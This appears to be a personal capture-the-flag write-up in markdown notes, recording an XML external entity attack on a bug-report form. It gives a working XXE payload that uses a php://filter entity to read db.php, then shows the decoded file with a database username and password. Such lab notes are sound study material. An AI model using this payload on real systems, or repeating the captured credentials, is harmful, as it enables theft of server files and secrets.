# XEE

### Log Submit invokes POST On 

![[Pasted image 20210724212531.png]]

![[Pasted image 20210724212546.png]]

Base64 XML Payload.

### GoBuster

![[Pasted image 20210724235821.png]]


### XXE

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=db.php">]>
		<bugreport>
		<title>START_&file;_END</title>
		<cwe>START_&file;_END</cwe>
		<cvss>START_&file;_END</cvss>
		<reward>START_&file;_END</reward>
		</bugreport>
```


```bash
echo 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=' | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

		```